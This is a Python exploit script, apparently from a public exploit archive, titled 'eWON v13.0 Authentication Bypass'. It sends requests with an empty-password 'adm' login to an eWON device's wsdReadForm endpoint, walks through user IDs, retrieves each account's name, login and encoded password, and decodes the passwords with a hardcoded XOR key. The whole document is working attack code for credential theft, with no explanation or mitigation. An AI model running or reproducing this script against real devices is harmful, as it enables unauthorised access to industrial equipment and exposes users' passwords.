#! /usr/bin/env python3
# -*- coding: utf-8 -*-
'''
    # Exploit Title: eWON v13.0 Authentication Bypass

'''
username = b'adm'

import urllib.request, urllib.parse, base64, sys

def decode(encpass):
    bXorString = bytes.fromhex('6414FE6F4C964746900208FC9B3904963A2F61')
    def decodePass(bPass):
        if len(bPass) > 19:
            print('Error, password can not exceed 19 characters')
            return ''
        sClearPass = ''
        for i in range (len(bPass)): sClearPass+= chr(bPass[i] ^ bXorString[i])
        return sClearPass
    if encpass.startswith('#_'): encpass = encpass.split('_')[2]
    sEncodedPass = base64.b64decode(encpass)[:-2] ## last two bytes are checksum
    print('Decoded password:       {}'.format(decodePass(sEncodedPass)))

def getUserData(userid, strIP, sAuthHeader):
    sURL = 'http://{}/wrcgi.bin/wsdReadForm'.format(strIP)
    oHeaders = {'Authorization':'Basic {}'.format(sAuthHeader)}
    sPostList = r'["inf_HasJVM","usr_FirstName|1","usr_LastName|1","usr_Login|1","usr_Password|1","usr_Information|1","usr_Right|1","usr_AccessPage|1","usr_AccessDir|1","usr_CBEn|1","usr_CBMode|1","usr_CBPhNum|1","ols_AllAndAssignedPageList","ols_DirList","ols_CBMode"]'
    sPostList = sPostList.replace(r'|1',r'|'+str(userid))
    oData = {'wsdList' : sPostList}
    oData = urllib.parse.urlencode(oData).encode()
    oRequest = urllib.request.Request(sURL, headers = oHeaders, data = oData)
    #oRequest.set_proxy('127.0.0.1:8080','http')
    oResponse  = urllib.request.urlopen(oRequest)
    resultarr = oResponse.read().split(b'","')
    if len(resultarr) == 20:
        fname = resultarr[1].decode()
        lname = resultarr[2].decode()
        usern = resultarr[3].decode()
        if len(usern) == 0: return True
        encpassword = resultarr[4]
        print('Decoding pass for user: {} ({} {}) '.format(usern, fname, lname))
        decode(encpassword.decode())
        print('---')
    return True

if len(sys.argv) >= 2:
    strIP = sys.argv[1]
else:
    strIP = input('Please enter an IP [10.0.0.53]: ')
    if strIP == '': strIP = '10.0.0.53'
    print('---')

sAuthHeader = base64.b64encode(username + b':').strip(b'=').decode()

for i in range(1, 20):
    if not getUserData(i, strIP, sAuthHeader):
        print('### That\'s all folks ;-) ###')
        input()
        exit(0)

if len(sys.argv) < 2: input('All Done')
